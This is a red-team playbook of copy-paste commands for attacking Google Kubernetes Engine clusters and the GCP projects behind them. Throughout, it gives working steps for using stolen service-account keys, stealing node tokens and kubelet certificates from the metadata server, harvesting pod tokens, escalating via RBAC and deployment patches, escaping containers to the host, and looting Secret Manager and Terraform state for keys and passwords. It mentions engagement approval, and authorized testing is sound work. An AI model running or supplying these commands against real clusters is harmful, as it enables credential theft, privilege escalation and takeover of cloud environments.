# GKE Attack Playbook — copy-paste commands

All commands are READ/ENUM unless marked **[WRITE]**. Per engagement rules, present and get explicit approval before running anything that touches the target.

---

## 0. Authenticate with a stolen credential
```bash
# SA key JSON (from leaked tfstate / google_service_account_key)
gcloud auth activate-service-account --key-file=stolen-sa.json
gcloud config set project <PROJECT_ID>
gcloud auth print-access-token        # raw OAuth token for REST calls

# Raw token (from metadata) used directly against REST
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

## 1. Recon the cluster posture (from outside, with project access)
```bash
gcloud container clusters list
gcloud container clusters describe <CLUSTER> --zone <ZONE> \
  --format="yaml(privateClusterConfig,masterAuthorizedNetworksConfig,networkPolicy,workloadIdentityConfig,legacyAbac,releaseChannel,currentMasterVersion,nodeConfig.serviceAccount,nodeConfig.oauthScopes,nodeConfig.metadata,nodeConfig.shieldedInstanceConfig)"
gcloud container clusters get-credentials <CLUSTER> --zone <ZONE>
kubectl get nodes -o wide
```

## 2. Public control plane probing (no creds)
```bash
curl -sk https://<CP_IP>/version
curl -sk https://<CP_IP>/healthz
kubectl --server=https://<CP_IP> --insecure-skip-tls-verify -n kube-system get pods   # anon RBAC?
```

## 3. From inside a compromised pod
```bash
# Where am I, what can I do
id; cat /etc/hostname
env | grep -iE 'KUBERNETES|GOOGLE|GCP'
kubectl auth can-i --list 2>/dev/null      # if kubectl present
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Decode the automounted SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null; echo

# Talk to the API server directly with the SA token
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

## 4. Node SA token via metadata (no Workload Identity)
```bash
# Token (project identity of the node)
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Scopes — if cloud-platform, full API breadth
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"
# Email of the node SA
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

# Header-less (only if disable-legacy-endpoints=false) — useful for SSRF
curl -s "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
```

## 5. kube-env → kubelet cert theft (legacy / concealment off)
```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env"
# Extract KUBELET_CERT / KUBELET_KEY / CA_CERT, write to files, then:
kubectl --server=https://<CP_IP> --client-certificate=kubelet.crt \
  --client-key=kubelet.key --certificate-authority=ca.crt \
  get secrets -A          # acts as system:node:<node> via Node authorizer
```

## 6. RBAC privilege escalation primitives
```bash
kubectl auth can-i --list
# High-value verbs to look for and how they escalate:
#   create pods                -> mount any SA token / schedule privileged pod
#   get/list secrets           -> harvest tokens directly
#   escalate (rbac roles)      -> grant yourself more than you have
#   bind     (rolebindings)    -> bind cluster-admin to yourself
#   impersonate (users/groups/sa) -> act as cluster-admin
#   create clusterrolebindings -> direct cluster-admin
```
**[WRITE]** Escalate via pod creation (mounts a privileged SA token onto a node):
```yaml
# privesc-pod.yaml — run only with authorization
apiVersion: v1
kind: Pod
metadata: { name: x, namespace: default }
spec:
  serviceAccountName: <privileged-sa-in-ns>
  containers:
  - name: x
    image: gcr.io/google-containers/pause
```

## 6b. Projected SA token harvesting + CRAC (see gke-real-world-chains.md)
```bash
# If /var/lib/kubelet/pods is reachable (node access, or a DaemonSet hostPath mount):
find /var/lib/kubelet/pods -path '*kube-api-access*/token' 2>/dev/null
for t in $(find /var/lib/kubelet/pods -path '*kube-api-access*/token'); do
  echo "== $t"; cut -d. -f2 < "$t" | base64 -d 2>/dev/null \
    | jq -r '."kubernetes.io".serviceaccount.name'
done
# Hunt for high-value SAs: clusterrole-aggregation-controller, metrics-server,
# stackdriver-metadata-agent-*, *-controller
```
**[WRITE]** `update deployments` → SA-swap to an admin SA:
```bash
kubectl -n kube-system patch deployment <dep> --type merge \
  -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-admin-sa>"}}}}'
```

## 7. Container escape primitives
```bash
# Privileged container -> mount host disk
fdisk -l; mount /dev/sda1 /mnt; chroot /mnt sh
# hostPID + privileged -> enter host PID 1
nsenter -t 1 -m -u -i -n -p -- bash
# hostPath '/' mounted at /host
chroot /host sh; cat /host/var/lib/kubelet/kubeconfig
# CAP_SYS_ADMIN -> cgroup release_agent escape (classic technique)
# docker.sock mounted -> docker -H unix:///var/run/docker.sock run --privileged ...
```

## 8. GCP post-exploitation with the node/WI SA
```bash
gcloud projects get-iam-policy <PROJECT> --format=json
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy <SA_EMAIL>   # who can actAs / tokenCreator?
gcloud secrets list; gcloud secrets versions access latest --secret=<NAME>
gsutil ls; gsutil ls -r gs://<BUCKET>
gcloud compute instances list
# Impersonation pivot (if tokenCreator on a higher-priv SA):
gcloud auth print-access-token --impersonate-service-account=<HIGHER_PRIV_SA>
```

## 9. Terraform state looting (read-only)
```bash
# State bucket discovered in backend.tf
gsutil ls gs://<STATE_BUCKET>/
gsutil cat gs://<STATE_BUCKET>/<env>/default.tfstate | jq '.resources[] | select(.type|test("secret|key|password"))'
# Local repo
rg -n "private_key|client_secret|password|BEGIN PRIVATE KEY" terraform.tfstate
```
